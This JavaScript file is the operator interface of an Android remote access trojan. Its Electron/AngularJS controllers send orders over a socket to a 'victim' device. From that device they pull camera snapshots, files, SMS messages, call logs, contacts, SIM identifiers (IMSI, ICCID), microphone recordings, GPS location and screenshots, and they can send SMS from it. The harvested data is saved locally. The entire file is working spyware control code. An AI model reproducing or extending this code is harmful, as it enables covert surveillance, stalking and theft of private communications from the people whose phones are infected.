const { remote } = require('electron');
const { ipcRenderer } = require('electron');
var app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
var fs = require("fs-extra");
const CONSTANTS = require(__dirname + '/assets/js/Constants')
var ORDER = CONSTANTS.order;
var socket = remote.getCurrentWebContents().victim;
var homedir = require('node-homedir');
var path = require("path");

var dataPath = path.join(homedir(), CONSTANTS.dataDir);
var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);

//-----------------------Routing Config------------------------
app.config(function ($routeProvider) {
    $routeProvider
        .when("/", {
            templateUrl: "./views/main.html"
        })
        .when("/camera", {
            templateUrl: "./views/camera.html",
            controller: "CamCtrl"
        })
        .when("/fileManager", {
            templateUrl: "./views/fileManager.html",
            controller: "FmCtrl"
        })
        .when("/smsManager", {
            templateUrl: "./views/smsManager.html",
            controller: "SMSCtrl"
        })
        .when("/callsLogs", {
            templateUrl: "./views/callsLogs.html",
            controller: "CallsCtrl"
        })
        .when("/contacts", {
            templateUrl: "./views/contacts.html",
            controller: "ContCtrl"
        })
        .when("/mic", {
            templateUrl: "./views/mic.html",
            controller: "MicCtrl"
        })
        .when("/location", {
            templateUrl: "./views/location.html",
            controller: "LocCtrl"
        })
        .when("/screenCapture", {
            templateUrl: "./views/screenCapture.html",
            controller: "ScreenCtrl"
        })
        .when("/simInfo", {
            templateUrl: "./views/simInfo.html",
            controller: "SimCtrl"
        });
});



//-----------------------LAB Controller (lab.htm)------------------------
// controller for Lab.html and its views mic.html,camera.html..etc
app.controller("LabCtrl", function ($scope, $rootScope, $location) {
    $labCtrl = $scope;
    var log = document.getElementById("logy");
    $labCtrl.logs = [];

    const window = remote.getCurrentWindow();
    $labCtrl.close = () => {
        window.close();
    };

    $labCtrl.maximize = () => {
        if (window.isMaximized()) {
            window.unmaximize(); // Restore the window size
        } else {
            window.maximize(); // Maximize the window
        }
    };


    $rootScope.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;

        $labCtrl.logs.push({ date: new Date().toLocaleString(), msg: msg, color: fontColor });
        log.scrollTop = log.scrollHeight;
        if (!$labCtrl.$$phase)
            $labCtrl.$apply();
    }

    //fired when notified from Main Proccess (main.js) about
    // this victim who disconnected
    ipcRenderer.on('SocketIO:VictimDisconnected', (event) => {
        $rootScope.Log('Victim Disconnected', CONSTANTS.logStatus.FAIL);
    });


    //fired when notified from the Main Process (main.js) about
    // the Server disconnection
    ipcRenderer.on('SocketIO:ServerDisconnected', (event) => {
        $rootScope.Log('[¡] Server Disconnected', CONSTANTS.logStatus.INFO);
    });




    // to move from view to another
    $labCtrl.goToPage = (page) => {
        $location.path('/' + page);
    }





});






//-----------------------Camera Controller (camera.htm)------------------------
// camera controller
app.controller("CamCtrl", function ($scope, $rootScope) {
    $camCtrl = $scope;
    $camCtrl.isSaveShown = false;
    var camera = CONSTANTS.orders.camera;

    // remove socket listner if the camera page is changed or destroied
    $camCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(camera);
    });


    $rootScope.Log('Get cameras list');
    $camCtrl.load = 'loading';
    // send order to victim to bring camera list
    socket.emit(ORDER, { order: camera, extra: 'camList' });



    // wait any response from victim
    socket.on(camera, (data) => {
        if (data.camList == true) { // the rseponse is camera list
            $rootScope.Log('Cameras list arrived', CONSTANTS.logStatus.SUCCESS);
            $camCtrl.cameras = data.list;
            $camCtrl.load = '';
            $camCtrl.selectedCam = $camCtrl.cameras[1];
            $camCtrl.$apply();
        } else if (data.image == true) { // the rseponse is picture

            $rootScope.Log('Picture arrived', CONSTANTS.logStatus.SUCCESS);

            // convert binary to base64
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $camCtrl.imgUrl = 'data:image/png;base64,' + base64String;
            $camCtrl.isSaveShown = true;
            $camCtrl.$apply();

            $camCtrl.savePhoto = () => {
                $rootScope.Log('Saving picture..');
                var picPath = path.join(downloadsPath, Date.now() + ".jpg");
                fs.outputFile(picPath, new Buffer(base64String, "base64"), (err) => {
                    if (!err)
                        $rootScope.Log('Picture saved on ' + picPath, CONSTANTS.logStatus.SUCCESS);
                    else
                        $rootScope.Log('Saving picture failed', CONSTANTS.logStatus.FAIL);

                });

            }

        }
    });


    $camCtrl.snap = () => {
        // send snap request to victim
        $rootScope.Log('Snap a picture');
        socket.emit(ORDER, { order: camera, extra: $camCtrl.selectedCam.id });
    }




});






//-----------------------File Controller (fileManager.htm)------------------------
// File controller
app.controller("FmCtrl", function ($scope, $rootScope) {
    $fmCtrl = $scope;
    $fmCtrl.load = 'loading';
    $fmCtrl.files = [];
    var fileManager = CONSTANTS.orders.fileManager;


    // remove socket listner
    $fmCtrl.$on('$destroy', () => {
        // release resources
        socket.removeAllListeners(fileManager);
    });

    // limit the ng-repeat
    // infinite scrolling
    $fmCtrl.barLimit = 30;
    $fmCtrl.increaseLimit = () => {
        $fmCtrl.barLimit += 30;
    }

    // send request to victim to bring files
    $rootScope.Log('Get files list');
    // socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' });
    socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/storage/emulated/0/' });

    socket.on(fileManager, (data) => {
        if (data.file == true) { // response with file's binary
            $rootScope.Log('Saving file..');
            var filePath = path.join(downloadsPath, data.name);

            // function to save the file to my local disk
            fs.outputFile(filePath, data.buffer, (err) => {
                if (err)
                    $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
                else
                    $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
            });

        } else if (data.length != 0) { // response with files list
            $rootScope.Log('Files list arrived', CONSTANTS.logStatus.SUCCESS);
            $fmCtrl.load = '';
            $fmCtrl.files = data;
            $fmCtrl.$apply();
        } else {
            $rootScope.Log('That directory is inaccessible (Access denied)', CONSTANTS.logStatus.FAIL);
            $fmCtrl.load = '';
            $fmCtrl.$apply();
        }

    });


    // when foder is clicked
    $fmCtrl.getFiles = (file) => {
        if (file != null) {
            $fmCtrl.load = 'loading';
            $rootScope.Log('Get ' + file);
            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: '/' + file });
        }
    };

    // when save button is clicked
    // send request to bring file's' binary
    $fmCtrl.saveFile = (file) => {
        $rootScope.Log('Downloading ' + '/' + file);
        socket.emit(ORDER, { order: fileManager, extra: 'dl', path: '/' + file });
    }

});







//-----------------------SMS Controller (sms.htm)------------------------
// SMS controller
app.controller("SMSCtrl", function ($scope, $rootScope) {
    $SMSCtrl = $scope;
    var sms = CONSTANTS.orders.sms;
    $SMSCtrl.smsList = [];
    $('.menu .item')
        .tab();

    $SMSCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(sms);
    });


    // send request to victim to bring all sms
    $SMSCtrl.getSMSList = () => {
        $SMSCtrl.load = 'loading';
        $SMSCtrl.barLimit = 50;
        $rootScope.Log('Get SMS list..');
        socket.emit(ORDER, { order: sms, extra: 'ls' });
    }

    $SMSCtrl.increaseLimit = () => {
        $SMSCtrl.barLimit += 50;
    }

    // send request to victim to send sms
    $SMSCtrl.SendSMS = (phoneNo, msg) => {
        $rootScope.Log('Sending SMS..');
        socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });
    }

    // save sms list to csv file
    $SMSCtrl.SaveSMS = () => {

        if ($SMSCtrl.smsList.length == 0)
            return;


        var csvRows = [];
        for (var i = 0; i < $SMSCtrl.smsList.length; i++) {
            csvRows.push($SMSCtrl.smsList[i].phoneNo + "," + $SMSCtrl.smsList[i].msg);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
        $rootScope.Log("Saving SMS List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("SMS List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }


    //listening for victim response
    socket.on(sms, (data) => {
        if (data.smsList) {
            $SMSCtrl.load = '';
            $rootScope.Log('SMS list arrived', CONSTANTS.logStatus.SUCCESS);
            $SMSCtrl.smsList = data.smsList;
            $SMSCtrl.smsSize = data.smsList.length;
            $SMSCtrl.$apply();
        } else {
            if (data == true)
                $rootScope.Log('SMS sent', CONSTANTS.logStatus.SUCCESS);
            else
                $rootScope.Log('SMS not sent', CONSTANTS.logStatus.FAIL);
        }
    });



});










//-----------------------Calls Controller (callslogs.htm)------------------------
// Calls controller
app.controller("CallsCtrl", function ($scope, $rootScope) {
    $CallsCtrl = $scope;
    $CallsCtrl.callsList = [];
    var calls = CONSTANTS.orders.calls;

    $CallsCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(calls);
    });

    $CallsCtrl.load = 'loading';
    $rootScope.Log('Get Calls list..');
    socket.emit(ORDER, { order: calls });


    $CallsCtrl.barLimit = 50;
    $CallsCtrl.increaseLimit = () => {
        $CallsCtrl.barLimit += 50;
    }


    $CallsCtrl.SaveCalls = () => {
        if ($CallsCtrl.callsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $CallsCtrl.callsList.length; i++) {
            var type = (($CallsCtrl.callsList[i].type) == 1 ? "INCOMING" : "OUTGOING");
            var name = (($CallsCtrl.callsList[i].name) == null ? "Unknown" : $CallsCtrl.callsList[i].name);
            csvRows.push($CallsCtrl.callsList[i].phoneNo + "," + name + "," + $CallsCtrl.callsList[i].duration + "," + type);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Calls_" + Date.now() + ".csv");
        $rootScope.Log("Saving Calls List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("Calls List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }

    socket.on(calls, (data) => {
        if (data.callsList) {
            $CallsCtrl.load = '';
            $rootScope.Log('Calls list arrived', CONSTANTS.logStatus.SUCCESS);
            $CallsCtrl.callsList = data.callsList;
            $CallsCtrl.logsSize = data.callsList.length;
            $CallsCtrl.$apply();
        }
    });



});





//-----------------------Contacts Controller (contacts.htm)------------------------
// Contacts controller
app.controller("ContCtrl", function ($scope, $rootScope) {
    $ContCtrl = $scope;
    $ContCtrl.contactsList = [];
    var contacts = CONSTANTS.orders.contacts;

    $ContCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(contacts);
    });

    $ContCtrl.load = 'loading';
    $rootScope.Log('Get Contacts list..');
    socket.emit(ORDER, { order: contacts });

    $ContCtrl.barLimit = 50;
    $ContCtrl.increaseLimit = () => {
        $ContCtrl.barLimit += 50;
    }

    $ContCtrl.SaveContacts = () => {

        if ($ContCtrl.contactsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $ContCtrl.contactsList.length; i++) {
            csvRows.push($ContCtrl.contactsList[i].phoneNo + "," + $ContCtrl.contactsList[i].name);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Contacts_" + Date.now() + ".csv");
        $rootScope.Log("Saving Contacts List...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("Contacts List Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }

    socket.on(contacts, (data) => {
        if (data.contactsList) {
            $ContCtrl.load = '';
            $rootScope.Log('Contacts list arrived', CONSTANTS.logStatus.SUCCESS);
            $ContCtrl.contactsList = data.contactsList;
            $ContCtrl.contactsSize = data.contactsList.length;
            $ContCtrl.$apply();
        }
    });





});



//-----------------------SIM Info Controller (simInfo.htm)------------------------
// SIM Info controller
app.controller("SimCtrl", function ($scope, $rootScope) {
    $SimCtrl = $scope;
    $SimCtrl.simList = [];
    var sim = CONSTANTS.orders.sim;

    $SimCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(sim);
    });

    $SimCtrl.load = 'loading';
    $rootScope.Log('Get SIM info..');
    socket.emit(ORDER, { order: sim });

    $SimCtrl.barLimit = 50;
    $SimCtrl.increaseLimit = () => {
        $SimCtrl.barLimit += 50;
    }

    $SimCtrl.SaveSIM = () => {

        if ($SimCtrl.simList.length == 0)
            return;

        var csvRows = [];
        csvRows.push("Slot Index,State,Operator Name,Display Name,MCC,MNC,Country ISO,IMSI,ICCID,Phone Number");
        for (var i = 0; i < $SimCtrl.simList.length; i++) {
            var sim = $SimCtrl.simList[i];
            csvRows.push(
                (sim.slotIndex || "N/A") + "," +
                (sim.simState || "N/A") + "," +
                (sim.operatorName || "N/A") + "," +
                (sim.displayName || "N/A") + "," +
                (sim.mcc || "N/A") + "," +
                (sim.mnc || "N/A") + "," +
                (sim.countryIso || "N/A") + "," +
                (sim.imsi || "N/A") + "," +
                (sim.iccid || "N/A") + "," +
                (sim.phoneNumber || "N/A")
            );
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "SIM_Info_" + Date.now() + ".csv");
        $rootScope.Log("Saving SIM Info...");
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log("Saving " + csvPath + " Failed", CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log("SIM Info Saved on " + csvPath, CONSTANTS.logStatus.SUCCESS);

        });

    }

    socket.on(sim, (data) => {
        if (data.simList) {
            $SimCtrl.load = '';
            $rootScope.Log('SIM info arrived', CONSTANTS.logStatus.SUCCESS);
            $SimCtrl.simList = data.simList;
            $SimCtrl.simCount = data.simCount || data.simList.length;
            $SimCtrl.hasTelephony = data.hasTelephony !== false;
            $SimCtrl.$apply();
        } else if (data.hasTelephony === false) {
            $SimCtrl.load = '';
            $rootScope.Log('Device has no telephony capability', CONSTANTS.logStatus.WARNING);
            $SimCtrl.hasTelephony = false;
            $SimCtrl.$apply();
        }
    });





});








//-----------------------Mic Controller (mic.htm)------------------------
// Mic controller
app.controller("MicCtrl", function ($scope, $rootScope) {
    $MicCtrl = $scope;
    $MicCtrl.isAudio = true;
    var mic = CONSTANTS.orders.mic;

    $MicCtrl.$on('$destroy', function () {
        // release resources, cancel Listner...
        socket.removeAllListeners(mic);
    });

    $MicCtrl.Record = (seconds) => {

        if (seconds) {
            if (seconds > 0) {
                $rootScope.Log('Recording ' + seconds + "'s...");
                socket.emit(ORDER, { order: mic, sec: seconds });
            } else
                $rootScope.Log('Seconds must be more than 0');

        }

    }


    socket.on(mic, (data) => {
        if (data.file == true) {
            $rootScope.Log('Audio arrived', CONSTANTS.logStatus.SUCCESS);

            var player = document.getElementById('player');
            var sourceMp3 = document.getElementById('sourceMp3');
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $MicCtrl.isAudio = false;
            $MicCtrl.$apply();
            sourceMp3.src = "data:audio/mp3;base64," + base64String;
            player.load();
            player.play();

            $MicCtrl.SaveAudio = () => {
                $rootScope.Log('Saving file..');
                var filePath = path.join(downloadsPath, data.name);
                fs.outputFile(filePath, data.buffer, (err) => {
                    if (err)
                        $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
                    else
                        $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
                });


            };



        }

    });
});





//-----------------------Location Controller (location.htm)------------------------
// Location controller
app.controller("LocCtrl", function ($scope, $rootScope) {
    $LocCtrl = $scope;
    var location = CONSTANTS.orders.location;

    $LocCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(location);
    });


    var map = L.map('mapid').setView([51.505, -0.09], 13);
    L.tileLayer('http://{s}.tile.osm.org/{z}/{x}/{y}.png', {}).addTo(map);

    $LocCtrl.Refresh = () => {

        $LocCtrl.load = 'loading';
        $rootScope.Log('Get Location..');
        socket.emit(ORDER, { order: location });

    }



    $LocCtrl.load = 'loading';
    $rootScope.Log('Get Location..');
    socket.emit(ORDER, { order: location });


    var marker;
    socket.on(location, (data) => {
        $LocCtrl.load = '';
        if (data.enable) {
            if (data.lat == 0 && data.lng == 0)
                $rootScope.Log('Try to Refresh', CONSTANTS.logStatus.FAIL);
            else {
                $rootScope.Log('Location arrived => ' + data.lat + "," + data.lng, CONSTANTS.logStatus.SUCCESS);
                var victimLoc = new L.LatLng(data.lat, data.lng);
                if (!marker)
                    var marker = L.marker(victimLoc).addTo(map);
                else
                    marker.setLatLng(victimLoc).update();

                map.panTo(victimLoc);
            }
        } else
            $rootScope.Log('Location Service is not enabled on Victim\'s Device', CONSTANTS.logStatus.FAIL);

    });

});



//-----------------------Screen Capture Controller (screenCapture.htm)------------------------
// Screen capture controller
app.controller("ScreenCtrl", function ($scope, $rootScope) {
    $screenCtrl = $scope;
    $screenCtrl.isSaveShown = false;
    $screenCtrl.imgUrl = null;
    $screenCtrl.base64String = null; // Store base64 for saving
    var screenCapture = CONSTANTS.orders.screenCapture;

    // remove socket listner if the screen capture page is changed or destroied
    $screenCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(screenCapture);
    });

    $rootScope.Log('Screen capture ready');
    $screenCtrl.load = '';

    // wait any response from victim
    socket.on(screenCapture, (data) => {
        console.log('[GUI] === Received data on event:', screenCapture);
        console.log('[GUI] Data type:', typeof data);
        console.log('[GUI] Data keys:', Object.keys(data));
        console.log('[GUI] data.image:', data.image);
        console.log('[GUI] data.error:', data.error);
        console.log('[GUI] data.buffer type:', typeof data.buffer);
        console.log('[GUI] data.buffer length:', data.buffer ? data.buffer.length : 'null');
        
        if (data.error == true) { // error response
            console.error('[GUI] Error received:', data.message);
            $rootScope.Log('Screen capture error: ' + data.message, CONSTANTS.logStatus.FAIL);
            $screenCtrl.load = '';
            $screenCtrl.isSaveShown = false;
            $screenCtrl.$apply();
        } else if (data.image == true) { // the response is screenshot
            console.log('[GUI] Image data received');
            console.log('[GUI] Buffer type:', Array.isArray(data.buffer) ? 'Array' : typeof data.buffer);
            console.log('[GUI] Buffer length:', data.buffer ? data.buffer.length : 'null');
            
            $rootScope.Log('Screenshot arrived', CONSTANTS.logStatus.SUCCESS);

            try {
                // convert binary to base64
                console.log('[GUI] Converting buffer to Uint8Array...');
                var uint8Arr;
                
                if (data.buffer instanceof Array) {
                    console.log('[GUI] Buffer is Array, converting...');
                    uint8Arr = new Uint8Array(data.buffer);
                } else if (data.buffer instanceof Uint8Array) {
                    console.log('[GUI] Buffer is already Uint8Array');
                    uint8Arr = data.buffer;
                } else if (Buffer.isBuffer && Buffer.isBuffer(data.buffer)) {
                    console.log('[GUI] Buffer is Node.js Buffer, converting...');
                    uint8Arr = new Uint8Array(data.buffer);
                } else {
                    console.error('[GUI] Unknown buffer type:', typeof data.buffer);
                    throw new Error('Unknown buffer type: ' + typeof data.buffer);
                }
                
                console.log('[GUI] Uint8Array length:', uint8Arr.length);
                
                var binary = '';
                console.log('[GUI] Converting to binary string...');
                for (var i = 0; i < uint8Arr.length; i++) {
                    binary += String.fromCharCode(uint8Arr[i]);
                }
                console.log('[GUI] Binary string length:', binary.length);
                
                console.log('[GUI] Converting to base64...');
                var base64String = window.btoa(binary);
                console.log('[GUI] Base64 string length:', base64String.length);
                console.log('[GUI] Base64 preview (first 50 chars):', base64String.substring(0, 50));

                // Store in scope for saving
                $screenCtrl.base64String = base64String;
                $screenCtrl.imgUrl = 'data:image/jpeg;base64,' + base64String;
                $screenCtrl.isSaveShown = true;
                $screenCtrl.load = '';
                console.log('[GUI] Image URL set, applying scope...');
                $screenCtrl.$apply();
                console.log('[GUI] Scope applied, image should be visible');
            } catch (e) {
                console.error('[GUI] Error processing screenshot:', e);
                console.error('[GUI] Error stack:', e.stack);
                $rootScope.Log('Error processing screenshot: ' + e.message, CONSTANTS.logStatus.FAIL);
                $screenCtrl.load = '';
                $screenCtrl.isSaveShown = false;
                $screenCtrl.$apply();
            }
        } else {
            console.warn('[GUI] Unknown data format:', data);
        }
    });

    // Save screenshot function
    $screenCtrl.saveScreenshot = () => {
        if (!$screenCtrl.base64String) {
            $rootScope.Log('No screenshot to save', CONSTANTS.logStatus.FAIL);
            return;
        }

        $rootScope.Log('Saving screenshot..');
        var picPath = path.join(downloadsPath, "screenshot_" + Date.now() + ".jpg");
        fs.outputFile(picPath, new Buffer($screenCtrl.base64String, "base64"), (err) => {
            if (!err)
                $rootScope.Log('Screenshot saved on ' + picPath, CONSTANTS.logStatus.SUCCESS);
            else
                $rootScope.Log('Saving screenshot failed: ' + err.message, CONSTANTS.logStatus.FAIL);
        });
    };

    $screenCtrl.capture = () => {
        // send capture request to victim
        console.log('[GUI] Sending screen capture command');
        console.log('[GUI] screenCapture constant:', screenCapture);
        console.log('[GUI] Socket connected:', socket.connected);
        console.log('[GUI] Socket ID:', socket.id);
        
        $rootScope.Log('Capturing screen...');
        $screenCtrl.load = 'loading';
        $screenCtrl.isSaveShown = false;
        $screenCtrl.imgUrl = null;
        socket.emit(ORDER, { order: screenCapture });
        
        console.log('[GUI] Command sent:', { order: screenCapture });
    }

});
